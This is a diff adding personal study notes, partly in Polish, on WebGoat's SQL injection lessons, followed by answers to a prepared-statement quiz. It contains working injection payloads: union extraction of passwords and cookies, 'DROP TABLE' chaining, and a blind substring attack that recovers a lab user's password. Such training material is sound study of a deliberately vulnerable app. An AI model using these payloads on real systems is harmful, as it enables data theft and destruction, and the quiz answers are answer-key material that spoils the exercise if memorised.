@@ -1,0 +1,79 @@
+/* */          are inline comments
+-- , #          are line comments
+
+Example: SELECT * FROM users WHERE name = 'admin' -- AND pass = 'pass'
+;        allows query chaining
+
+Example: SELECT * FROM users; DROP TABLE users;
+',+,||         allows string concatenation
+Char()         strings without quotes
+
+Example: SELECT * FROM users WHERE name = '+char(27) OR 1=1
+
+Union
+The Union operator is used, to combine the results of two or more SELECT Statements.
+
+Rules to keep in mind, when working with a UNION:
+
+The number of columns selected in each statement must be the same.
+
+The datatype of the first column in the first SELECT statement, must match the datatype of the first column in the second (third, fourth, …​) SELECT Statement. The Same applies to all other columns.
+
+SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;
+The UNION ALL Syntax also allows duplicate Values.
+
+Joins
+The Join operator is used to combine rows from two or more tables, based on a related column
+
+SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;
+
+3) '; select * from user_system_data;--
+' union select 1, user_name, password, cookie, 'a', 'a', 1 from user_system_data;--
+
+Blind SQL injection
+Blind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the application’s response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.
+
+Difference
+Let us first start with the difference between a normal SQL injection and a blind SQL injection. In a normal SQL injection the error messages from the database are displayed and gives enough information to find out how the query is working. Or in the case of a UNION based SQL injection the application does not reflect the information directly on the web page. So in the case where nothing is displayed you will need to start asking the database questions based on a true or false statement. That is why a blind SQL injection is much more difficult to exploit.
+
+There are several different types of blind SQL injections: content-based and time-based SQL injections.
+
+Example
+In this case we are trying to ask the database a boolean question based on a unique id, for example suppose we have the following url: https://my-shop.com?article=4 On the server side this query will be translated as follows:
+
+SELECT * FROM articles WHERE article_id = 4
+When we want to exploit this we change the url into: https://shop.example.com?article=4 AND 1=1 This will be translated to:
+
+SELECT * FROM articles WHERE article_id = 4 and 1 = 1
+
+5) tom' AND '1' = '1 -> register form jest podatny na atak
+"User {0} already exists please try to register with a different username."
+Dopóki dostajemy powyższy komunikat, to znaczy że dostajemy TRUE.
+tom' AND substring(password, 1, 1) ='a
+Tak sprawdzamy po kolei każdą literę
+
+Atakiem bruteforce, możemy poznać hasło Toma.
+Potrzebujemy URL na który będziemy wysyłać zapytania, jakich headerów potrzebujemy i jaki body musimy przesyłać:
+Request URL: http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge
+Autoryzujemy się do WebGoat poprzez Cookie:
+Cookie: JSESSIONID=DDQos9rvlcM7xgIGLKvJQD7DIv8qmPgIM0r0dRfX; WEBWOLFSESSION=lqEaXggkOKIAUWMRihT91pzh3L1sf_QkVqVeGvDf
+Payload
+username_reg: 
+email_reg: 
+password_reg: 
+confirm_password_reg:
+
+Za pomocą skryptu w pythonie, który po kolei pyta o każdą literę alfabetu, znajdujemy hasło:
+thisisasecretfortomonly
+
+6) 
+1. What is the difference between a prepared statement and a statement?
+Solution 4: A statement has got values instead of a prepared statement
+2. Which one of the following characters is a placeholder for variables?
+Solution 3: ?
+3. How can prepared statements be faster than statements?
+Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
+4. How can a prepared statement prevent SQL-Injection?
+Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
+5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
+Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
